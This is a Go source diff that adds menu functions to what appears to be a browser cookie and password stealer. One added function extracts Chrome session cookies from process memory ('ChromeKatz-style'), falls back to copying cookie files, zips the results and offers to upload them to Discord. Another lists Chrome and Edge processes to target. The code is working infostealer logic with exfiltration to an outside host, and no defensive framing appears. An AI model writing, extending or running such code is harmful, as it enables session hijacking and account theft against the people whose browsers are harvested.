@@ -623,3 +623,135 @@ func extractFirefoxPasswordsCookies(profilePath string) ([]BrowserCookie, error)
 	// For now, focus on cookies which are unencrypted
 	return extractFirefoxCookies(filepath.Join(profilePath, "cookies.sqlite"))
 }
+
+func runMemoryExtraction() {
+	reader := bufio.NewReader(os.Stdin)
+
+	if runtime.GOOS != "windows" {
+		fmt.Printf("%s[!] Memory extraction only available on Windows%s\n", utils.Red, utils.Reset)
+		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
+		reader.ReadString('\n')
+		return
+	}
+
+	fmt.Printf("%sEnter path for output ZIP file: %s", utils.Green, utils.Reset)
+	zipPath, _ := reader.ReadString('\n')
+	zipPath = strings.TrimSpace(zipPath)
+	zipPath = normalizeZipPath(zipPath)
+
+	fmt.Printf("%s[*] Extracting cookies from Chrome process memory (ChromeKatz-style)...%s\n", utils.Blue, utils.Reset)
+
+	cookies, err := ExtractCookiesFromMemory()
+	if err != nil {
+		fmt.Printf("%s[!] Memory extraction failed: %v%s\n", utils.Red, err, utils.Reset)
+		fmt.Printf("%s[*] Falling back to file-based extraction...%s\n", utils.Yellow, utils.Reset)
+
+		total, outputFiles, err := collectCookies(zipPath)
+		if err != nil {
+			fmt.Printf("%s[!] Fallback failed: %v%s\n", utils.Red, err, utils.Reset)
+			fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
+			reader.ReadString('\n')
+			return
+		}
+
+		fmt.Printf("%s[✓] Collected %d cookies (via file-based extraction)%s\n", utils.Green, total, utils.Reset)
+		fmt.Printf("%s[✓] Zip file created: %s%s\n", utils.Blue, zipPath, utils.Reset)
+		fmt.Printf("%s[✓] Files inside zip:%s\n", utils.Blue, utils.Reset)
+		for _, file := range outputFiles {
+			fmt.Printf("  - %s\n", file)
+		}
+
+		fmt.Printf("\n%sSend this zip to Discord? (y/n): %s", utils.Yellow, utils.Reset)
+		sendChoice, _ := reader.ReadString('\n')
+		sendChoice = strings.TrimSpace(strings.ToLower(sendChoice))
+		if sendChoice == "y" || sendChoice == "yes" {
+			if err := sendZipToDiscord(zipPath); err != nil {
+				fmt.Printf("%s[!] Discord upload failed: %v%s\n", utils.Red, err, utils.Reset)
+			} else {
+				fmt.Printf("%s[✓] Zip uploaded to Discord successfully%s\n", utils.Green, utils.Reset)
+			}
+		}
+
+		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
+		reader.ReadString('\n')
+		return
+	}
+
+	if len(cookies) == 0 {
+		fmt.Printf("%s[!] No cookies found in process memory%s\n", utils.Red, utils.Reset)
+		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
+		reader.ReadString('\n')
+		return
+	}
+
+	// Create output file with memory-extracted cookies
+	files := make(map[string][]byte)
+	if err := os.MkdirAll(filepath.Dir(zipPath), 0755); err != nil {
+		fmt.Printf("%s[!] Failed to create output directory: %v%s\n", utils.Red, err, utils.Reset)
+		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
+		reader.ReadString('\n')
+		return
+	}
+
+	content := buildCookieText(cookies)
+	files["Chrome_Memory_Extract.txt"] = content
+
+	if err := writeZip(zipPath, files); err != nil {
+		fmt.Printf("%s[!] Failed to create ZIP: %v%s\n", utils.Red, err, utils.Reset)
+		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
+		reader.ReadString('\n')
+		return
+	}
+
+	fmt.Printf("%s[✓] Extracted %d cookies from memory%s\n", utils.Green, len(cookies), utils.Reset)
+	fmt.Printf("%s[✓] Zip file created: %s%s\n", utils.Blue, zipPath, utils.Reset)
+
+	fmt.Printf("\n%sSend this zip to Discord? (y/n): %s", utils.Yellow, utils.Reset)
+	sendChoice, _ := reader.ReadString('\n')
+	sendChoice = strings.TrimSpace(strings.ToLower(sendChoice))
+	if sendChoice == "y" || sendChoice == "yes" {
+		if err := sendZipToDiscord(zipPath); err != nil {
+			fmt.Printf("%s[!] Discord upload failed: %v%s\n", utils.Red, err, utils.Reset)
+		} else {
+			fmt.Printf("%s[✓] Zip uploaded to Discord successfully%s\n", utils.Green, utils.Reset)
+		}
+	}
+
+	fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
+	reader.ReadString('\n')
+}
+
+func listChromeProcesses() {
+	reader := bufio.NewReader(os.Stdin)
+
+	if runtime.GOOS != "windows" {
+		fmt.Printf("%s[!] Process listing only available on Windows%s\n", utils.Red, utils.Reset)
+		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
+		reader.ReadString('\n')
+		return
+	}
+
+	fmt.Printf("%s[*] Available Chrome/Edge processes:%s\n", utils.Blue, utils.Reset)
+
+	processes, err := ListChromeProcesses()
+	if err != nil {
+		fmt.Printf("%s[!] Failed to enumerate processes: %v%s\n", utils.Red, err, utils.Reset)
+		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
+		reader.ReadString('\n')
+		return
+	}
+
+	if len(processes) == 0 {
+		fmt.Printf("%s[!] No Chrome/Edge processes found%s\n", utils.Yellow, utils.Reset)
+		fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
+		reader.ReadString('\n')
+		return
+	}
+
+	for i, proc := range processes {
+		fmt.Printf("%s[%d]%s PID: %d - %v\n", utils.Green, i+1, utils.Reset, proc["pid"], proc["name"])
+	}
+
+	fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
+	reader.ReadString('\n')
+}
